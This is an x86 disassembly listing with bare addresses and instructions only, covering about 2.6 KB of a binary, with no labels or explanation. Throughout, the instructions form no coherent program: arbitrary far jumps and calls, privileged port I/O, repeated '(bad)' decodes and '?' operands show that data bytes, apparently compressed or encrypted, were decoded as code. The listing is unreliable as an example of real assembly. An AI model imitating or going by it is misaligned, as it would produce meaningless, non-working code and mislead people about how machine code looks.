  41d28b:	adc    dl,BYTE PTR [ebx+eax*1-0x34575975]
  41d292:	cmp    cl,cl
  41d294:	lods   al,BYTE PTR ds:[esi]
  41d295:	pop    esp
  41d296:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d297:	xor    esi,DWORD PTR [esi+0x5223cf78]
  41d29d:	sahf   
  41d29e:	retf   0x7d41
  41d2a1:	mov    ch,0x5c
  41d2a3:	fistp  QWORD PTR [edx+0x4673b43e]
  41d2a9:	retf   0x2ef1
  41d2ac:	pusha  
  41d2ad:	xchg   esp,eax
  41d2ae:	imul   edi,esi,0x2e
  41d2b1:	jmp    0x19f6:0xdee274e
  41d2b8:	das    
  41d2b9:	mov    eax,ds:0x59863796
  41d2be:	aaa    
  41d2bf:	inc    ecx
  41d2c0:	icebp  
  41d2c1:	int3   
  41d2c2:	icebp  
  41d2c3:	mov    ch,0xae
  41d2c5:	add    esi,ebx
  41d2c7:	sbb    DWORD PTR [edi],edx
  41d2c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d2ca:	push   ecx
  41d2cb:	or     al,0xa5
  41d2cd:	inc    eax
  41d2ce:	hlt    
  41d2cf:	rol    DWORD PTR [ecx+esi*1],cl
  41d2d2:	(bad)  
  41d2d3:	addr16 daa 
  41d2d5:	das    
  41d2d6:	les    eax,FWORD PTR [ecx-0x1ace49c1]
  41d2dc:	or     BYTE PTR [ebp*2+0x364dbbbd],0x29
  41d2e4:	ror    BYTE PTR [eax-0x377360aa],0x99
  41d2eb:	stos   BYTE PTR es:[edi],al
  41d2ec:	cmp    eax,0x37dc493f
  41d2f1:	jg     0x41d2d7
  41d2f3:	outs   dx,DWORD PTR ds:[esi]
  41d2f4:	dec    edx
  41d2f5:	sbb    BYTE PTR [ecx+0x7873cbea],0x85
  41d2fc:	lods   eax,DWORD PTR ds:[esi]
  41d2fd:	xor    ah,0xa7
  41d300:	and    DWORD PTR [ecx-0x5bd35a5a],esp
  41d306:	out    0x9c,eax
  41d308:	push   0xffffffda
  41d30a:	pop    esi
  41d30b:	cmp    al,0xb8
  41d30d:	div    BYTE PTR [ebx]
  41d30f:	jbe    0x41d2bc
  41d311:	xchg   dh,dl
  41d313:	or     bh,BYTE PTR [ebx+0xf]
  41d316:	test   DWORD PTR [eax+0x191d6f1b],ebx
  41d31c:	hlt    
  41d31d:	(bad)  
  41d31f:	jne    0x41d2e6
  41d321:	jmp    0xa27245c1
  41d326:	pop    ebx
  41d327:	push   edi
  41d328:	cwde   
  41d329:	jns    0x41d2f8
  41d32b:	inc    ecx
  41d32c:	call   0x25d9ae8c
  41d331:	in     eax,0xd
  41d333:	pop    ebx
  41d334:	aad    0x3f
  41d336:	pusha  
  41d337:	cs call 0x6d88a938
  41d33d:	sbb    al,0x7b
  41d33f:	mov    cs,WORD PTR [edi+0xa]
	...
  41d3b1:	add    BYTE PTR [eax],al
  41d3b3:	add    BYTE PTR [ebx+0x20],dl
  41d3b6:	mov    al,ds:0x5faef3ae
  41d3bb:	std    
  41d3bc:	cmp    eax,0x4c
  41d3bf:	(bad)  
  41d3c0:	dec    edi
  41d3c1:	jnp    0x41d437
  41d3c3:	pop    ecx
  41d3c4:	adc    bh,BYTE PTR [ebx]
  41d3c6:	add    DWORD PTR [eax],eax
  41d3c8:	test   BYTE PTR [eax],0x0
  41d3cb:	add    BYTE PTR [edx],dl
  41d3cd:	jo     0x41d3e7
  41d3cf:	dec    esi
  41d3d0:	data16 jp 0x41d382
  41d3d3:	outs   dx,DWORD PTR ds:[esi]
  41d3d4:	cli    
  41d3d5:	mov    al,BYTE PTR [edx]
  41d3d7:	ja     0x41d455
  41d3d9:	cmc    
  41d3da:	data16 jle 0x41d45c
  41d3dd:	adc    eax,0x9c30b730
  41d3e2:	std    
  41d3e3:	inc    ebp
  41d3e4:	stos   BYTE PTR es:[edi],al
  41d3e5:	das    
  41d3e6:	aas    
  41d3e7:	inc    edi
  41d3e8:	push   0xad6b7119
  41d3ed:	loop   0x41d393
  41d3ef:	sbb    DWORD PTR [ebx+0x4e82e601],esi
  41d3f5:	mov    dh,0xc6
  41d3f7:	mov    BYTE PTR [edx+0x20],bh
  41d3fa:	mov    BYTE PTR [eax],ch
  41d3fc:	pop    ds
  41d3fd:	push   edi
  41d3fe:	(bad)  
  41d3ff:	out    dx,al
  41d400:	in     eax,dx
  41d401:	shl    DWORD PTR [ebp-0x753efe32],cl
  41d407:	cmp    bh,BYTE PTR [ebx]
  41d409:	bound  ebx,QWORD PTR ds:0xa4abf8da
  41d40f:	push   eax
  41d410:	addr16 es pop es
  41d413:	ins    BYTE PTR es:[edi],dx
  41d414:	inc    edi
  41d415:	add    edi,esi
  41d417:	add    esp,edx
  41d419:	rcr    BYTE PTR [esi-0x10],0x7a
  41d41d:	aas    
  41d41e:	(bad)  
  41d41f:	sbb    al,0xac
  41d421:	mov    edi,0xa1c09dde
  41d426:	outs   dx,BYTE PTR ds:[esi]
  41d427:	ds out dx,eax
  41d429:	neg    DWORD PTR [esi]
  41d42b:	inc    ebp
  41d42c:	sbb    BYTE PTR ds:0xdb44cd69,al
  41d432:	sbb    dl,dl
  41d434:	test   esp,ebp
  41d436:	adc    ecx,edx
  41d438:	mul    DWORD PTR [ebx-0x4a]
  41d43b:	aad    0xe2
  41d43d:	dec    esp
  41d43e:	inc    ebp
  41d43f:	mov    ebx,0xccb54fa1
  41d444:	das    
  41d445:	pop    ebx
  41d446:	jnp    0x41d3d0
  41d448:	icebp  
  41d449:	inc    esp
  41d44a:	lds    esi,FWORD PTR [eax+0x4d]
  41d44d:	fidivr WORD PTR [ebx]
  41d44f:	cmp    eax,0x1829276
  41d454:	xchg   edi,eax
  41d455:	pop    ds
  41d456:	push   es
  41d457:	repz mov ebx,0xaf15b25a
  41d45d:	shl    BYTE PTR [ebx+0x7edbb714],0xb7
  41d464:	jge    0x41d4be
  41d466:	pop    ss
  41d467:	pop    ecx
  41d468:	hlt    
  41d469:	popf   
  41d46a:	push   es
  41d46b:	aam    0x25
  41d46d:	(bad)  
  41d46e:	xor    eax,0x7ae07170
  41d473:	jle    0x41d4ea
  41d475:	inc    edx
  41d476:	lods   eax,DWORD PTR ds:[esi]
  41d477:	pop    edi
  41d478:	mov    al,ds:0x12cbed41
  41d47d:	(bad)  
  41d47e:	les    esi,FWORD PTR [ebp+0x3c]
  41d481:	fdivr  QWORD PTR [ebx]
  41d483:	add    BYTE PTR ds:0xc80811a1,dl
  41d489:	(bad)  
  41d48a:	das    
  41d48b:	jp     0x41d4e2
  41d48d:	leave  
  41d48e:	jae    0x41d499
  41d490:	dec    ebp
  41d491:	bound  edx,QWORD PTR [edx+0x2d8de61c]
  41d497:	jo     0x41d437
  41d499:	cdq    
  41d49a:	fadd   QWORD PTR [esp+ecx*4-0x5674f4e1]
  41d4a1:	pop    edx
  41d4a2:	cmc    
  41d4a3:	int3   
  41d4a4:	ss cs out 0x4a,eax
  41d4a8:	mov    dh,0xc8
  41d4aa:	or     BYTE PTR [edx+0x2a],bh
  41d4ad:	add    esi,ebx
  41d4af:	ja     0x41d46c
  41d4b1:	dec    ebx
  41d4b2:	push   ss
  41d4b3:	scas   eax,DWORD PTR es:[edi]
  41d4b4:	inc    esi
  41d4b5:	cdq    
  41d4b6:	push   ebx
  41d4b7:	nop
  41d4b8:	gs cli 
  41d4ba:	call   FWORD PTR [edx+0x1f]
  41d4bd:	fcomp  DWORD PTR [ecx+0xd3f733]
	...
  41d533:	add    ch,al
  41d535:	and    edx,DWORD PTR [ecx-0xa4808db]
  41d53b:	jecxz  0x41d58e
  41d53d:	or     edi,DWORD PTR [edx+ecx*8+0x648c1913]
  41d544:	or     BYTE PTR [ecx+eax*1],bh
  41d547:	add    dh,dh
  41d549:	add    BYTE PTR [eax],al
  41d54b:	add    dl,bl
  41d54d:	xor    eax,0x11f4b50c
  41d552:	adc    BYTE PTR [eax],bl
  41d554:	xor    ch,bh
  41d556:	scas   eax,DWORD PTR es:[edi]
  41d557:	cmp    bl,BYTE PTR [edi+0x36]
  41d55a:	jmp    0x1430:0x672a52cf
  41d561:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d562:	and    eax,0x76cba99f
  41d567:	add    cl,0xb0
  41d56a:	outs   dx,BYTE PTR ds:[esi]
  41d56b:	add    eax,eax
  41d56d:	(bad)  
  41d56e:	cmp    eax,0xc2ebf4a0
  41d573:	xchg   ebx,eax
  41d574:	xchg   esi,eax
  41d575:	lds    ecx,FWORD PTR [ecx-0x3047f3eb]
  41d57b:	and    dh,0x6a
  41d57e:	cmp    al,BYTE PTR [esp+ebx*1]
  41d581:	and    DWORD PTR [ebx+0xd],0x49
  41d585:	cmp    edi,DWORD PTR [esp+ecx*8-0x47]
  41d589:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d58a:	pop    ebp
  41d58b:	stos   DWORD PTR es:[edi],eax
  41d58c:	jae    0x41d56a
  41d58e:	ret    
  41d58f:	ds syscall 
  41d592:	mov    eax,ds:0x4deb17e8
  41d597:	inc    edx
  41d598:	sar    BYTE PTR [ecx],cl
  41d59a:	xchg   esp,eax
  41d59b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d59c:	cld    
  41d59d:	mov    edx,0x92b1a862
  41d5a2:	inc    edx
  41d5a3:	popa   
  41d5a4:	xor    eax,0xee4c510a
  41d5a9:	push   cs
  41d5aa:	xchg   BYTE PTR [edi+0x20],al
  41d5ad:	(bad)  
  41d5ae:	push   0xf1f9b690
  41d5b3:	sub    cl,ah
  41d5b5:	js     0x41d5fc
  41d5b7:	inc    ecx
  41d5b8:	mov    ah,0xd4
  41d5ba:	xchg   edx,eax
  41d5bb:	or     eax,DWORD PTR [ebp+0x5896b509]
  41d5c1:	inc    ebp
  41d5c2:	stc    
  41d5c3:	xlat   BYTE PTR ds:[ebx]
  41d5c4:	call   0x33cc9d89
  41d5c9:	add    DWORD PTR [eax],ecx
  41d5cb:	jmp    0x41d58a
  41d5cd:	push   esi
  41d5ce:	stos   BYTE PTR es:[edi],al
  41d5cf:	(bad)  
  41d5d0:	fsubrp st(0),st
  41d5d2:	jb     0x41d5f7
  41d5d4:	cmp    edi,eax
  41d5d6:	sbb    edx,DWORD PTR es:0x941ce1f9
  41d5dd:	xor    al,bh
  41d5df:	fist   DWORD PTR [edi]
  41d5e1:	aad    0x27
  41d5e3:	or     bh,BYTE PTR [ebx-0x49]
  41d5e6:	ret    
  41d5e7:	jb     0x41d597
  41d5e9:	out    0x7c,eax
  41d5eb:	ror    BYTE PTR [edi+0x46],1
  41d5ee:	imul   ebx,DWORD PTR [eax-0x7b],0x2c
  41d5f2:	xchg   ebp,eax
  41d5f3:	mov    ebp,DWORD PTR [ecx*8+0x6f1e1ef1]
  41d5fa:	in     eax,dx
  41d5fb:	dec    edi
  41d5fc:	sbb    BYTE PTR [edx+0x5368a216],bh
  41d602:	test   cl,bh
  41d604:	std    
  41d605:	aad    0x22
  41d607:	jnp    0x41d60c
  41d609:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d60a:	pop    ds
  41d60b:	sub    eax,0xd5d1c5fa
  41d610:	xchg   esi,eax
  41d611:	push   ecx
  41d612:	dec    ebx
  41d613:	sbb    edx,DWORD PTR [edi-0x1c]
  41d616:	(bad)  
  41d617:	rol    al,1
  41d619:	jp     0x41d5af
  41d61b:	ss jg  0x41d5c3
  41d61e:	cs sbb eax,0x256ffcb7
  41d624:	mov    edx,0xa2e80da5
  41d629:	(bad)  
  41d62a:	int    0x2c
  41d62c:	push   ecx
  41d62d:	std    
  41d62e:	pushf  
  41d62f:	(bad)  
  41d630:	fnsave [eax-0x18ab9fc8]
  41d636:	and    al,0xb9
  41d638:	mov    eax,DWORD PTR [eax+eiz*4+0x31154606]
  41d63f:	pushf  
  41d640:	stos   DWORD PTR es:[edi],eax
  41d641:	or     DWORD PTR [eax],eax
	...
  41d6b3:	add    dl,bl
  41d6b5:	add    edx,eax
  41d6b7:	xchg   bl,bl
  41d6b9:	(bad)  
  41d6ba:	ficomp WORD PTR [ebp+0x8]
  41d6bd:	push   0x45dc0a3b
  41d6c2:	ss (bad) 
  41d6c4:	(bad)  
  41d6c5:	cmp    al,0x1
  41d6c7:	add    dh,dh
  41d6c9:	add    BYTE PTR [eax],al
  41d6cb:	add    BYTE PTR [edi-0x14e8ba1a],cl
  41d6d1:	fcomp  DWORD PTR [ecx+0x2b0e14e1]
  41d6d7:	push   0xc2a3aa44
  41d6dc:	out    dx,al
  41d6dd:	clc    
  41d6de:	and    ch,BYTE PTR [edx-0x40079309]
  41d6e4:	(bad)
  41d6e7:	cdq    
  41d6e8:	(bad)  
  41d6e9:	cmp    edx,DWORD PTR [esi-0x49e30645]
  41d6ef:	daa    
  41d6f0:	ficomp WORD PTR [esp+eiz*4+0x507cfe62]
  41d6f7:	and    BYTE PTR [eax],bl
  41d6f9:	jg     0x41d6a2
  41d6fb:	sub    ah,BYTE PTR [ecx]
  41d6fd:	int    0xf1
  41d6ff:	xlat   BYTE PTR ds:[ebx]
  41d700:	sub    al,0xdb
  41d702:	and    BYTE PTR [edx+0x56],bl
  41d705:	push   ebp
  41d706:	mov    eax,?
  41d708:	call   0x49f3:0x542edeb4
  41d70f:	cmp    al,0xd0
  41d711:	add    ah,bh
  41d713:	or     cl,BYTE PTR [esi]
  41d715:	arpl   WORD PTR [edx+0x3d],sp
  41d718:	sbb    DWORD PTR [edx],edx
  41d71a:	aad    0x99
  41d71c:	dec    ebp
  41d71d:	xlat   BYTE PTR ds:[ebx]
  41d71e:	cmc    
  41d71f:	fld    QWORD PTR [eax+eiz*1+0x7230a169]
  41d726:	stos   DWORD PTR es:[edi],eax
  41d727:	mov    ds,WORD PTR [edi-0x40]
  41d72a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d72b:	sbb    eax,0x4e79b174
  41d730:	inc    edi
  41d731:	jmp    0xb1f0:0xfe9a9f52
  41d738:	adc    al,0x41
  41d73a:	cwde   
  41d73b:	mov    esi,0x798b8307
  41d740:	out    dx,al
  41d741:	or     al,0xd5
  41d743:	pop    esi
  41d744:	je     0x41d767
  41d746:	cld    
  41d747:	push   ebx
  41d748:	mov    bh,0x8a
  41d74a:	cmp    BYTE PTR [eax+edi*4-0x7c61ff1b],bh
  41d751:	xor    DWORD PTR [eax*4-0xcbd47b2],ebx
  41d758:	js     0x41d73a
  41d75a:	pop    eax
  41d75b:	mov    ebx,edi
  41d75d:	dec    edi
  41d75e:	pop    cx
  41d760:	sbb    DWORD PTR [edx],0xbe3086d5
  41d766:	sbb    edi,ebx
  41d768:	and    ch,BYTE PTR cs:[ebx]
  41d76b:	xchg   ebx,eax
  41d76c:	rol    dh,1
  41d76e:	fwait
  41d76f:	cmp    DWORD PTR [edi+ecx*4+0x2f9385d4],0x5b985510
  41d77a:	and    ebx,DWORD PTR [ecx-0x11c5cd71]
  41d780:	int    0x49
  41d782:	sub    BYTE PTR [esi],0x3b
  41d785:	add    edi,esi
  41d787:	or     eax,DWORD PTR [ecx+ecx*4-0x45f72206]
  41d78e:	lea    ebp,[edi+0x10]
  41d791:	out    dx,eax
  41d792:	dec    ebx
  41d793:	enter  0xbc0f,0x98
  41d797:	fidivr WORD PTR [edx]
  41d799:	popf   
  41d79a:	mov    ds:0x67ca6bb7,eax
  41d79f:	jg     0x41d723
  41d7a1:	push   cs
  41d7a2:	mov    edi,0xb1f5aeed
  41d7a7:	pop    ss
  41d7a8:	inc    eax
  41d7a9:	and    edi,eax
  41d7ab:	icebp  
  41d7ac:	cli    
  41d7ad:	xor    bl,BYTE PTR [ecx-0x1c]
  41d7b0:	pop    es
  41d7b1:	into   
  41d7b2:	jno    0x41d7ba
  41d7b4:	pop    ecx
  41d7b5:	aaa    
  41d7b6:	dec    BYTE PTR ds:0x8ef0ce31
  41d7bc:	cmp    ecx,eax
  41d7be:	jns    0x41d741
  41d7c0:	les    edx,FWORD PTR [ebx+0x0]
	...
  41d833:	add    BYTE PTR [ebx+0x34],ah
  41d836:	lods   eax,DWORD PTR ds:[esi]
  41d837:	xor    al,0xff
  41d839:	mov    ebp,0xf28777fb
  41d83e:	pop    es
  41d83f:	add    edx,DWORD PTR [edi-0xb1dfc67]
  41d845:	cmp    eax,0xf60001
  41d84a:	add    BYTE PTR [eax],al
  41d84c:	push   edi
  41d84d:	inc    ebp
  41d84e:	lods   eax,DWORD PTR ds:[esi]
  41d84f:	jne    0x41d833
  41d851:	ja     0x41d86d
  41d853:	xchg   esp,eax
  41d854:	inc    edx
  41d855:	bound  edi,QWORD PTR ds:0xa9190074
  41d85b:	jmp    0x41d86b
  41d85d:	pop    ss
  41d85e:	sbb    ah,BYTE PTR [ebx-0x1e4423ee]
  41d864:	popa   
  41d865:	retf   0x9732
  41d868:	clc    
  41d869:	inc    eax
  41d86a:	or     ecx,esp
  41d86c:	or     edi,ebx
  41d86e:	lds    esi,FWORD PTR [ebx]
  41d870:	arpl   ax,bx
  41d872:	or     BYTE PTR [ecx],0x1a
  41d875:	or     al,0xdf
  41d877:	push   ds
  41d878:	dec    esi
  41d879:	xchg   DWORD PTR [eax],ebx
  41d87b:	or     al,0xd3
  41d87d:	adc    esp,DWORD PTR [eax-0x12]
  41d880:	adc    BYTE PTR [edx+0x21eb0a93],bh
  41d886:	int3   
  41d887:	mov    DWORD PTR [ebp+0x5274955],edi
  41d88d:	pop    es
  41d88e:	add    ch,ah
  41d890:	scas   eax,DWORD PTR es:[edi]
  41d891:	icebp  
  41d892:	dec    ecx
  41d893:	pusha  
  41d894:	lahf   
  41d895:	int    0x22
  41d897:	sar    DWORD PTR [eax-0x1a2a2746],0x86
  41d89e:	aaa    
  41d89f:	sti    
  41d8a0:	(bad)  
  41d8a1:	or     DWORD PTR [ecx-0x62969293],ecx
  41d8a7:	cmp    eax,0x3a2c138e
  41d8ac:	ret    0x60a9
  41d8af:	mov    esp,0x92e8d5ac
  41d8b4:	(bad)  
  41d8b5:	(bad)  
  41d8b6:	jmp    0xaa5b:0x7fbe4a0b
  41d8bd:	mov    dh,0xec
  41d8bf:	inc    eax
  41d8c0:	mov    ds:0xa262a032,eax
  41d8c5:	jnp    0x41d8da
  41d8c7:	sub    eax,0xfe784778
  41d8cc:	dec    eax
  41d8cd:	mov    bl,0xd1
  41d8cf:	into   
  41d8d0:	mov    WORD PTR [edx],?
  41d8d2:	ror    DWORD PTR [edi],cl
  41d8d4:	out    dx,eax
  41d8d5:	es sub eax,0x3b197dd7
  41d8db:	sub    DWORD PTR [edx],ebp
  41d8dd:	aam    0x96
  41d8df:	jmp    0x41d920
  41d8e1:	jmp    0x215ef4f4
  41d8e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d8e7:	sub    eax,0x3cb67c26
  41d8ec:	cvtdq2ps xmm1,XMMWORD PTR [edx]
  41d8ef:	inc    esi
  41d8f0:	mov    eax,0x712e525c
  41d8f5:	xchg   esp,eax
  41d8f6:	(bad)
  41d8f9:	dec    esi
  41d8fa:	sar    bl,1
  41d8fc:	(bad)  
  41d8fd:	jb     0x41d883
  41d8ff:	out    0x7c,al
  41d901:	jl     0x41d920
  41d903:	cmp    BYTE PTR [ecx+0x735f66d6],cl
  41d909:	pop    ebp
  41d90a:	sub    eax,0x75310491
  41d90f:	ret    
  41d910:	push   ds
  41d911:	mov    ebx,0x32efb7fd
  41d916:	ds xchg edi,eax
  41d918:	lods   al,BYTE PTR ds:[esi]
  41d919:	idiv   BYTE PTR [ecx]
  41d91b:	sti    
  41d91c:	fcmove st,st(2)
  41d91e:	out    0x1e,eax
  41d920:	jg     0x41d94e
  41d922:	pop    es
  41d923:	repnz stc 
  41d925:	popf   
  41d926:	fisttp WORD PTR [esi]
  41d928:	fld    QWORD PTR [ebx-0x51]
  41d92b:	sub    ebx,edi
  41d92d:	mov    eax,ds:0x46484e57
  41d932:	int    0xbc
  41d934:	scas   eax,DWORD PTR es:[edi]
  41d935:	jo     0x41d99d
  41d937:	push   edx
  41d938:	inc    ebp
  41d939:	fwait
  41d93a:	outs   dx,DWORD PTR ds:[esi]
  41d93c:	cwde   
  41d93d:	ja     0x41d94c
  41d93f:	mov    edx,0x9a9d
	...
  41d9b4:	lock retf 0xfc94
  41d9b8:	mov    esi,0xfdcef8fe
  41d9bd:	cwde   
  41d9be:	sbb    eax,0x9c13031c
  41d9c3:	jge    0x41d9af
  41d9c5:	add    DWORD PTR ds:[eax],eax
  41d9c8:	test   BYTE PTR [eax],0x0
  41d9cb:	add    BYTE PTR [ebp+0x0],ch
  41d9ce:	inc    ecx
  41d9cf:	lahf   
  41d9d0:	push   0xffffffe3
  41d9d2:	test   eax,0x9f9d69b7
  41d9d7:	mov    ah,0xe1
  41d9d9:	cmp    esi,DWORD PTR [edx+0x1021b8db]
  41d9df:	inc    ebx
  41d9e0:	lock mov dh,0x1
  41d9e3:	inc    esi
  41d9e4:	fadd   st(4),st
  41d9e6:	jne    0x41da34
  41d9e8:	push   cs
  41d9e9:	gs mov cl,0x66
  41d9ec:	outs   dx,BYTE PTR ds:[esi]
  41d9ed:	in     al,0xc
  41d9ef:	pop    esp
  41d9f0:	pop    ecx
  41d9f1:	jb     0x41da1f
  41d9f3:	test   DWORD PTR [ebx+0x21195a8c],esi
  41d9f9:	or     eax,0xe0ae4ab2
  41d9fe:	sbb    BYTE PTR ds:[ebp+0x56],dl
  41da02:	int3   
  41da03:	sub    BYTE PTR cs:[ecx-0x2d],cl
  41da07:	xchg   edi,eax
  41da08:	pop    ecx
  41da09:	sti    
  41da0a:	(bad)  
  41da0b:	(bad)  
  41da0c:	sbb    DWORD PTR [ebp-0x4444d2cb],edx
  41da12:	cmp    eax,0x7b689a6a
  41da17:	lods   al,BYTE PTR ds:[esi]
  41da18:	mov    DWORD PTR [edi-0x47],edi
  41da1b:	dec    ebx
  41da1c:	int3   
  41da1d:	pushf  
  41da1e:	jno    0x41d9fa
  41da20:	repz jp 0x41d9a5
  41da23:	shl    DWORD PTR [ecx],0x98
  41da26:	or     DWORD PTR [esi+0x732d3b7b],ebx
  41da2c:	adc    ah,bl
  41da2e:	sahf   
  41da2f:	cmp    al,dh
  41da31:	clc    
  41da32:	push   esp
  41da33:	mov    edi,0xbc197f1b
  41da38:	sti    
  41da39:	shr    esp,0x93
  41da3c:	ret    0x52b7
  41da3f:	add    dl,bl
  41da41:	adc    eax,DWORD PTR [eax+0x61ff155d]
  41da47:	adc    dh,BYTE PTR [edx-0x77]
  41da4a:	std    
  41da4b:	push   edx
  41da4c:	adc    eax,0xb61a5d3a
  41da51:	jo     0x41da42
  41da53:	test   ax,0x291d
  41da57:	and    eax,0x8e3a7a9
  41da5c:	add    DWORD PTR [edi-0x6e],ecx
  41da5f:	jb     0x41da13
  41da61:	aas    
  41da62:	adc    al,0xcd
  41da64:	arpl   WORD PTR [ecx-0x418879e2],ax
  41da6a:	and    BYTE PTR [esi-0x5f],dh
  41da6d:	outs   dx,BYTE PTR ds:[esi]
  41da6e:	xchg   esi,eax
  41da6f:	xchg   edi,eax
  41da70:	call   0xd7427114
  41da75:	mov    al,0x84
  41da77:	pushf  
  41da78:	inc    ebx
  41da79:	cmc    
  41da7a:	std    
  41da7b:	mov    ch,0x26
  41da7d:	mov    ds:0x1fa7e96d,eax
  41da82:	fstp   DWORD PTR [esi]
  41da84:	adc    eax,0xf6a31c7a
  41da89:	cmp    edi,DWORD PTR [ecx]
  41da8b:	and    DWORD PTR [edx+ebx*2],ebx
  41da8e:	popa   
  41da8f:	dec    ebp
  41da90:	cmp    DWORD PTR [esp+ebx*4],esi
  41da93:	test   al,0xbc
  41da95:	jmp    0x1c82:0xaf1d5960
  41da9c:	xor    eax,esi
  41da9e:	push   ds
  41da9f:	mov    ecx,0x4bb38642
  41daa4:	call   0x5998d7aa
  41daa9:	pop    es
  41daaa:	pop    ebx
  41daab:	pop    edx
  41daac:	daa    
  41daad:	push   esp
  41daae:	pop    es
  41daaf:	in     al,0x34
  41dab1:	sub    al,0xe5
  41dab3:	seta   BYTE PTR ds:0xb247e5ef
  41daba:	cmc    
  41dabb:	test   ch,ah
  41dabd:	sbb    edi,DWORD PTR [eax+0x38de2d]
	...
  41db33:	add    BYTE PTR [ecx],ch
  41db35:	(bad)  
  41db36:	sti    
  41db37:	pop    ebp
  41db38:	(bad)  
  41db39:	jge    0x41daea
  41db3b:	div    dl
  41db3d:	cmp    ebp,0xb
  41db40:	or     DWORD PTR [eax+0x3fe00fb3],ebp
  41db46:	add    DWORD PTR [eax],eax
  41db48:	test   BYTE PTR [eax],0x0
  41db4b:	add    BYTE PTR [ecx-0x22565fa0],cl
  41db51:	and    al,0xfd
  41db53:	adc    eax,DWORD PTR [esi+0x57209ce]
  41db59:	sar    esi,cl
  41db5b:	mov    dh,0xb9
  41db5d:	add    BYTE PTR [edx],0x56
  41db60:	xchg   edx,eax
  41db61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41db62:	lds    ebx,FWORD PTR [edi+0x7c862bf6]
  41db68:	(bad)  [edx-0x6669d12f]
  41db6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41db6f:	mov    bl,BYTE PTR [esi]
  41db71:	cdq    
  41db72:	dec    esi
  41db73:	adc    bh,BYTE PTR [ebp+0x7d]
  41db76:	mov    ds:0x1d535861,eax
  41db7b:	sbb    BYTE PTR [edx+0x58769a04],ah
  41db81:	push   esp
  41db82:	cmp    eax,0xb04d044d
  41db87:	data16 loope 0x41dbca
  41db8a:	push   ebp
  41db8b:	jecxz  0x41db3c
  41db8d:	cmp    ch,BYTE PTR [eax]
  41db8f:	hlt    
  41db90:	push   edi
  41db91:	add    ah,BYTE PTR [ebp+0x3a59e7b4]
  41db97:	cmp    bh,BYTE PTR [edi+0x63a7c3d8]
  41db9d:	sbb    cl,BYTE PTR [eax-0xa]
  41dba0:	xor    DWORD PTR [ebx],eax
  41dba2:	iret   
  41dba3:	ror    BYTE PTR [edi-0x58],cl
  41dba6:	shr    BYTE PTR [eax-0x37e7e16b],1
  41dbac:	xchg   ebx,eax
  41dbad:	xchg   esp,eax
  41dbae:	pop    esi
  41dbaf:	mov    ebx,0xbb098c67
  41dbb4:	add    DWORD PTR [eax+0x4b],eax
  41dbb7:	jl     0x41db5b
  41dbb9:	xchg   esi,eax
  41dbba:	mov    edi,0xea7e0cd7
  41dbbf:	sbb    al,0xcb
  41dbc1:	mov    dl,0x69
  41dbc3:	clc    
  41dbc4:	jb     0x41dbb2
  41dbc6:	mov    WORD PTR [edi],?
  41dbc8:	push   ebp
  41dbc9:	dec    edi
  41dbca:	mov    eax,0x1fddbd4c
  41dbcf:	sub    WORD PTR [ebp+ecx*8+0xca3eeb4],0xad36
  41dbd9:	sbb    eax,0xce167910
  41dbde:	daa    
  41dbdf:	es sti 
  41dbe1:	and    al,0x5d
  41dbe3:	daa    
  41dbe4:	(bad)  
  41dbe5:	std    
  41dbe6:	lock mov esp,0xe78e692d
  41dbec:	push   edx
  41dbed:	repz or eax,0xa75662e8
  41dbf3:	test   BYTE PTR [ecx],bh
  41dbf5:	xchg   ebp,eax
  41dbf6:	sbb    ebp,edx
  41dbf8:	icebp  
  41dbf9:	add    al,0x18
  41dbfb:	pop    edx
  41dbfc:	call   0x9781b9fa
  41dc01:	xchg   esp,eax
  41dc02:	xor    DWORD PTR [ebx],ebx
  41dc04:	jmp    0x41dc85
  41dc06:	rcr    DWORD PTR [esi],0xc5
  41dc09:	pop    ecx
  41dc0a:	stos   DWORD PTR es:[edi],eax
  41dc0b:	add    DWORD PTR [ecx],ebp
  41dc0d:	nop
  41dc0e:	mov    dl,0x95
  41dc10:	inc    esi
  41dc11:	pop    eax
  41dc12:	jb     0x41dc35
  41dc14:	fld    DWORD PTR [esi]
  41dc16:	inc    ecx
  41dc17:	sbb    al,BYTE PTR [ecx-0x7da8bc0b]
  41dc1d:	retf   0xe20e
  41dc20:	outs   dx,BYTE PTR ds:[esi]
  41dc21:	pop    ebp
  41dc22:	jecxz  0x41dbe8
  41dc24:	inc    ebx
  41dc25:	shr    DWORD PTR [ebx*2-0x3a00422c],1
  41dc2c:	sub    BYTE PTR [eax+0x455b0770],bh
  41dc32:	lds    ebp,FWORD PTR [ecx+eax*4-0x1]
  41dc36:	jl     0x41dc59
  41dc38:	addr16 cli 
  41dc3a:	shl    DWORD PTR [ecx],0x9c
  41dc3d:	pop    es
  41dc3e:	sbb    BYTE PTR [esi+0x55],dl
  41dc41:	mov    es,WORD PTR [eax]
	...
  41dcb3:	add    BYTE PTR [eax-0x67],ah
  41dcb6:	fsubr  st(5),st
  41dcb8:	std    
  41dcb9:	in     eax,0x79
  41dcbb:	popf   
  41dcbc:	jle    0x41dc59
  41dcbe:	es and al,0x37
  41dcc1:	xchg   edx,eax
  41dcc2:	jl     0x41dcd9
  41dcc4:	(bad)  
  41dcc5:	inc    eax
  41dcc6:	add    DWORD PTR [eax],eax
  41dcc8:	test   BYTE PTR [eax],0x0
  41dccb:	add    BYTE PTR [edx-0x1d],bh
  41dcce:	and    BYTE PTR [edi-0x61ffb79f],bl
  41dcd4:	outs   dx,DWORD PTR ds:[esi]
  41dcd5:	jmp    0x41dd52
  41dcd7:	xchg   BYTE PTR ds:0x36839858,dh
  41dcdd:	xchg   esi,eax
  41dcde:	cmc    
  41dcdf:	iret   
  41dce0:	xor    eax,0x71358b18
  41dce5:	mov    ah,0x8e
  41dce7:	mov    bh,0x59
  41dce9:	fwait
  41dcea:	mov    dh,0x5f
  41dcec:	push   ds
  41dced:	jb     0x41dc6f
  41dcef:	cwde   
  41dcf0:	push   ds
  41dcf1:	add    eax,0xc9085938
  41dcf6:	hlt    
